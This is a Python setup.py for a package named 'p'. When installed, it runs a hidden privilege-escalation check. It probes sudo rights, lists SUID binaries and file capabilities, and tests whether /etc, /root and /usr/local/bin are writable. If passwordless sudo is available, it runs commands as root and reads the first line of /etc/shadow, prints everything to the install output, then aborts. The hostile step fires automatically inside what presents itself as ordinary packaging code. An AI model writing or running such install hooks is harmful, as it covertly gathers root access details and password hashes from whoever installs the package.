import os, sys, subprocess as sp
from setuptools import setup

def r():
    o = sys.stderr.write
    o("\n--- PRIVESC CHECK ---\n")
    
    o(f"UID: {os.getuid()}\n")
    
    # 1. Sudo check
    s = sp.getoutput("sudo -n -l 2>/dev/null")
    o(f"SUDO_L: {s if s else 'NONE'}\n")
    
    # 2. SUID binaries
    suid = sp.getoutput("find /usr/bin /usr/sbin -perm -4000 -type f 2>/dev/null | head -n 5")
    o(f"SUID:\n{suid}\n")
    
    # 3. Try exploit sudo
    if "ALL" in s or "NOPASSWD" in s:
        o("TRYING SUDO...\n")
        o(f"ROOT_CHECK: {sp.getoutput('sudo whoami')}\n")
        o(f"SHADOW: {sp.getoutput('sudo head -n 1 /etc/shadow')}\n")

    # 4. Capabilities
    caps = sp.getoutput("getcap -r / 2>/dev/null | head -n 5")
    o(f"CAPS:\n{caps}\n")

    # 5. Writable system paths
    wp = []
    for d in ['/etc', '/root', '/usr/local/bin']:
        if os.access(d, os.W_OK): wp.append(d)
    o(f"WRITABLE: {wp}\n")

    o("--- END ---\n")
    sys.exit(1)

try: r()
except: sys.exit(1)

setup(name="p", version="0.1")
